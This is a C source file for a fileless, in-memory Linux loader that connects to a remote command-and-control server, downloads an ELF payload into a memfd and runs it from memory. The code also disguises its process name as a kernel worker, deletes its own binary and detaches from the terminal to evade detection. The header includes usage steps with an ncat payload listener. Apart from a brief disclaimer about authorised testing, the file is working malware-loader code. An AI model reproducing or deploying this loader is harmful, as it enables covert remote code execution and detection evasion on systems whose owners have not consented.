/*
 * ---------------------------------------------------------------------------
 *  Fileless In-Memory Loader Linux @4quarks
 * ---------------------------------------------------------------------------
 *  Summary:
 *  This tool implements a fileless, in-memory ELF loader for Linux systems.
 *  It connects to a remote C2 (Command & Control) server over TCP, downloads
 *  a raw ELF payload, and executes it entirely from memory using memfd_create().
 *
 *  Key Features:
 *  - Uses memfd_create() to create a memory-backed, executable file descriptor
 *  - Pulls payload from a configurable C2 IP and port over a socket connection
 *  - Executes the ELF binary directly from memory via /proc/self/fd/<fd>
 *  - Applies a fake process name (argv[0]) for stealth in `ps`, `top`, etc.
 *  - Deletes itself from disk (via unlink("/proc/self/exe")) after execution
 *  - Leaves no payload or loader trace on the filesystem after startup
 *
 *  Typical Use:
 *    1. Compile the loader:
 *         $  gcc -o loader memfd-loader.c
 *    2. Start a listener to serve the payload binary:
 *         $ ncat -lvnp 1111 < payload.elf
 *    3. Execute the loader:
 *         $ ./loader
 *
 *  Warning:
 *  This code is for educational and authorized testing purposes only.
 *  Unauthorized use against systems you don't own or have permission to test
 *  is illegal and unethical.
  */


#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <fcntl.h>
#include <arpa/inet.h>

#ifndef __NR_memfd_create
#define __NR_memfd_create 279
#endif
#define MFD_CLOEXEC 1
#define BUF_SIZE 1024

extern char **environ;

// Parameters
const char *C2_IP        = "127.0.0.1";       // C2 IP
const int   C2_PORT      = 1111;              // C2 port
const char *FAKE_PROC    = "[kworker/u!0]";   // Shown in `ps` output
const char *FD_NAME      = "error";          // Shown in `cat /proc/<pid>/maps` as [memfd:error (deleted)]

// SYS_call wrapper for memfd_create
static inline int memfd_create(const char *name, unsigned int flags) {
    return syscall(__NR_memfd_create, name, flags);
}

// Execute payload from memory using /proc/self/fd/<fd>
int exec_memfd(int fd, char **argv, char **envp) {
    char path[BUF_SIZE];
    snprintf(path, sizeof(path), "/proc/%d/fd/%d", getpid(), fd);
    execve(path, argv, envp);
    return -1;
}

int main(int argc, char **argv) {
    int sock, fd, n;
    struct sockaddr_in addr;
    char buffer[BUF_SIZE];
    char *exec_argv[] = {(char *)FAKE_PROC, NULL};

    // Build sockaddr
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &addr.sin_addr);

    // Connect to C2
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("connect");
        close(sock);
        exit(EXIT_FAILURE);
    }

    // Create anonymous memory-backed file
    if ((fd = memfd_create(FD_NAME, MFD_CLOEXEC)) < 0) {
        perror("memfd_create");
        close(sock);
        exit(EXIT_FAILURE);
    }

    // Read and write payload into memfd
    while ((n = read(sock, buffer, sizeof(buffer))) > 0) {
        if (write(fd, buffer, n) != n) {
            perror("write");
            close(sock);
            exit(EXIT_FAILURE);
        }
        if (n < BUF_SIZE) break;
    }

    close(sock);

    // Self-delete loader
    unlink("/proc/self/exe");  

    // Fork and execute from memory
    pid_t pid = fork();
    if (pid == 0) {
        setsid();  // Detach from terminal
        exec_memfd(fd, exec_argv, environ);
        perror("exec_memfd");
        exit(EXIT_FAILURE);
    }

    return 0;
}
